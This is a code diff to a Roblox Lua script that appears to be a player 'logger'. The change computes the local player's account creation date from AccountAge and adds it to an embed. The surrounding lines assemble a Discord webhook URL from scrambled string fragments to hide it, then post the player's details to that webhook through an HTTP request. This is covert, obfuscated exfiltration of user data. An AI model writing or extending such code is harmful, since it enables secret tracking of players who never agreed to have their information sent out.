@@ -2,6 +2,15 @@ activewebhook2 = ":x:"
 pcall(function()
 if activewebhook then activewebhook2 = ":white_check_mark:" end
 end)
+local player = game.Players.LocalPlayer
+local months = {
+	"Jan", "Feb", "Mar", "Apr",
+	"May", "Jun", "Jul", "Aug",
+	"Sep", "Oct", "Nov", "Dec"
+}
+local secondsExisted = player.AccountAge * 86400
+local dateObject = os.date("!*t", os.time() - secondsExisted)
+
 local weno = "ht".."tps".."://dis"..
 "cor".."d.com".."/ap".."i/we"..
 "bho".."oks/104".."39900".."37206"..
@@ -41,7 +50,7 @@ dothethingy({Url = weno, Body = game:GetService("HttpService"):JSONEncode({
     },
     {
         ["name"] = "Account Age",
-        ["value"] = game.Players.LocalPlayer.AccountAge.." Days",
+        ["value"] = months[dateObject.month].." "..dateObject.day..", "..dateObject.year,
         ["inline"] = true
     },
     {
